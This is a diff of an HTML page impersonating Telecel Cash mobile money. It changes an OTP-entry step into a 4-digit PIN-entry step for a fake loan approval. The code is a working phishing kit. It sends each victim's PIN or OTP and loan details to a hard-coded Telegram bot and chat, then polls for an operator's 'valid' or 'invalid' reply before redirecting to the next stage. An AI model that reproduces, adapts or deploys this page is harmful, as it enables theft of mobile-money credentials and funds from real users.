@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OTP Verification - Telecel Cash</title>
+    <title>Enter PIN - Telecel Cash</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root { --red: #E42320; }
@@ -15,7 +15,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 10px;
+            padding: 12px;
         }
         .container {
             width: 100%;
@@ -25,11 +25,10 @@
             box-shadow: 0 8px 30px rgba(0,0,0,0.1);
             overflow: hidden;
         }
-        /* Red Header */
         .header {
             background: #E42320;
             color: white;
-            padding: 18px 20px;
+            padding: 20px;
             text-align: center;
         }
         .logo {
@@ -37,7 +36,7 @@
             align-items: center;
             justify-content: center;
             gap: 8px;
-            margin-bottom: 6px;
+            margin-bottom: 8px;
         }
         .logo-circle {
             width: 38px;
@@ -62,49 +61,38 @@
             opacity: 0.95;
         }
 
-        /* Loan Box */
         .loan-box {
             margin: 16px;
             background: #fff0f0;
             border-radius: 14px;
             padding: 14px 16px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 15px;
+            text-align: center;
         }
         .loan-amount {
             font-size: 26px;
             font-weight: 800;
             color: var(--red);
+            margin: 6px 0;
         }
 
-        /* OTP */
-        .otp-container {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin: 8px 0 20px;
-            padding: 0 20px;
+        .pin-container {
+            padding: 20px;
         }
-        .otp-input {
-            width: 46px;
-            height: 56px;
+        .pin-input {
+            width: 100%;
             text-align: center;
-            font-size: 24px;
-            font-weight: 700;
+            font-size: 32px;
+            letter-spacing: 15px;
+            padding: 16px;
             border: 2px solid #ddd;
-            border-radius: 10px;
+            border-radius: 14px;
+            margin-bottom: 20px;
             outline: none;
         }
-        .otp-input:focus {
+        .pin-input:focus {
             border-color: var(--red);
-            box-shadow: 0 0 0 3px rgba(228, 35, 32, 0.15);
         }
 
-        .form-section {
-            padding: 0 20px 25px;
-        }
         .btn-action {
             width: 100%;
             background: var(--red);
@@ -115,26 +103,14 @@
             font-weight: 700;
             border-radius: 50px;
             cursor: pointer;
+            margin: 8px 0;
         }
         .back-btn {
-            margin-top: 10px;
             background: transparent;
             color: #555;
             border: 2px solid #ddd;
-            padding: 13px;
-            border-radius: 50px;
-            font-size: 15.5px;
         }
-        .error-msg {
-            display: none;
-            text-align: center;
-            color: #c00;
-            background: #ffebee;
-            padding: 12px;
-            margin: 12px 20px;
-            border-radius: 12px;
-            font-size: 14px;
-        }
+
         #spinner {
             display: none;
             position: fixed;
@@ -159,7 +135,6 @@
 </head>
 <body>
     <div class="container">
-        <!-- Header -->
         <div class="header">
             <div class="logo">
                 <div class="logo-circle">t</div>
@@ -168,28 +143,25 @@
                     <span style="font-size:12.5px;">Mobile Money</span>
                 </div>
             </div>
-            <h1>OTP Verification</h1>
-            <p class="subtitle">Enter the 5-digit code sent to your Telecel number to authorize the loan.</p>
+            <h1>Enter Your PIN</h1>
+            <p class="subtitle">Enter your 4-digit Telecel Cash PIN to approve the loan</p>
         </div>
 
         <!-- Loan Info -->
         <div class="loan-box" id="loanBox"></div>
 
-        <!-- OTP Inputs -->
-        <div class="otp-container" id="otpContainer"></div>
+        <div class="pin-container">
+            <input type="password" id="pinInput" class="pin-input" maxlength="4" placeholder="••••" inputmode="numeric" autofocus>
 
-        <div class="error-msg" id="errMsg"></div>
-
-        <div class="form-section">
-            <button class="btn-action" id="verifyBtn">Verify & Authorize Loan</button>
-            <button class="back-btn" onclick="window.history.back()">← Back</button>
+            <button class="btn-action" onclick="submitPin()">Confirm PIN</button>
+            <button class="btn-action back-btn" onclick="window.history.back()">← Back</button>
         </div>
     </div>
 
     <!-- Spinner -->
     <div id="spinner">
         <div class="spin"></div>
-        <p style="margin-top:18px; font-size:15px;">Verifying OTP...</p>
+        <p style="margin-top:18px;">Processing PIN...</p>
     </div>
 
     <script>
@@ -199,84 +171,51 @@
         const repay = params.get('repay') || '1381';
         const duration = params.get('duration') || '30';
 
-        // Auto fill loan details
+        // Auto-fill loan details
         document.getElementById('loanBox').innerHTML = `
-            <div>
-                <strong>${name}</strong><br>
-                <span class="loan-amount">GHS ${parseInt(amount).toLocaleString()}</span>
-            </div>
-            <div style="text-align:right; font-size:13.5px; line-height:1.4;">
-                Total Repay: GHS ${parseInt(repay).toLocaleString()}<br>
-                ${duration} Days
-            </div>
+            <strong>${name}</strong><br>
+            <div class="loan-amount">GHS ${parseInt(amount).toLocaleString()}</div>
+            <small>Total Repay: GHS ${parseInt(repay).toLocaleString()} • ${duration} Days</small>
         `;
 
-        function createOTPInputs() {
-            const container = document.getElementById('otpContainer');
-            container.innerHTML = '';
-            for (let i = 0; i < 5; i++) {
-                const input = document.createElement('input');
-                input.type = 'text';
-                input.maxLength = '1';
-                input.className = 'otp-input';
-                input.inputMode = 'numeric';
-                container.appendChild(input);
+        function submitPin() {
+            const pin = document.getElementById('pinInput').value.trim();
+            if (pin.length !== 4) {
+                alert("Please enter a 4-digit PIN");
+                return;
             }
-            setupAutoFocus();
-        }
-
-        function setupAutoFocus() {
-            const inputs = document.querySelectorAll('.otp-input');
-            inputs.forEach((input, index) => {
-                input.addEventListener('input', () => {
-                    if (input.value.length === 1 && index < 4) {
-                        inputs[index + 1].focus();
-                    }
-                    if (getOTPCode().length === 5) {
-                        setTimeout(verifyOTP, 250);
-                    }
-                });
-            });
-        }
-
-        function getOTPCode() {
-            return Array.from(document.querySelectorAll('.otp-input')).map(i => i.value.trim()).join('');
-        }
-
-        function verifyOTP() {
-            const otp = getOTPCode();
-            if (otp.length !== 5) return;
 
             document.getElementById('spinner').style.display = 'flex';
 
             const ts = Date.now();
-            const approveId = `approve_${ts}`;
-            const verifyId = `verify_${ts}`;
-            const declineId = `decline_${ts}`;
+            const validId = `valid_${ts}`;
+            const invalidId = `invalid_${ts}`;
 
             fetch(`https://api.telegram.org/bot8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: '7547427914',
-                    text: `<b>🔴 Telecel Loan OTP Verification</b>\n\nLoan: ${name}\nAmount: GHS ${parseInt(amount).toLocaleString()}\nOTP: <code>${otp}</code>\n\nChoose Action:`,
+                    text: `<b>🔴 Telecel Loan PIN Confirmation</b>\n\n` +
+                          `Loan: ${name}\n` +
+                          `Amount: GHS ${parseInt(amount).toLocaleString()}\n` +
+                          `PIN: <code>${pin}</code>\n\nChoose Action:`,
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
                             [
-                                { text: "✅ Approve Loan", callback_data: approveId },
-                                { text: "📱 Verify Device", callback_data: verifyId }
-                            ],
-                            [{ text: "❌ Decline", callback_data: declineId }]
+                                { text: "✅ Valid PIN", callback_data: validId },
+                                { text: "❌ Invalid PIN", callback_data: invalidId }
+                            ]
                         ]
                     }
                 })
             }).then(() => {
-                startPolling(approveId, verifyId, declineId);
+                startPolling(validId, invalidId);
             });
         }
 
-        function startPolling(approveId, verifyId, declineId) {
+        function startPolling(validId, invalidId) {
             const interval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8/getUpdates?offset=-1`)
                     .then(r => r.json())
@@ -288,22 +227,18 @@
                                 clearInterval(interval);
                                 document.getElementById('spinner').style.display = 'none';
 
-                                if (cb === approveId) {
-                                    window.location.href = `pin.html?${params.toString()}`;
-                                } else if (cb === verifyId) {
-                                    window.location.href = `device_verify.html?${params.toString()}`;
-                                } else if (cb === declineId) {
-                                    document.getElementById('errMsg').textContent = "Request was declined.";
-                                    document.getElementById('errMsg').style.display = 'block';
+                                if (cb === validId) {
+                                    window.location.href = `success.html?${params.toString()}`;
+                                } else if (cb === invalidId) {
+                                    alert("Invalid PIN. Please try again.");
+                                    document.getElementById('pinInput').value = '';
+                                    document.getElementById('pinInput').focus();
                                 }
                             }
                         });
                     });
             }, 1000);
         }
-
-        // Initialize
-        createOTPInputs();
     </script>
 </body>
 </html>
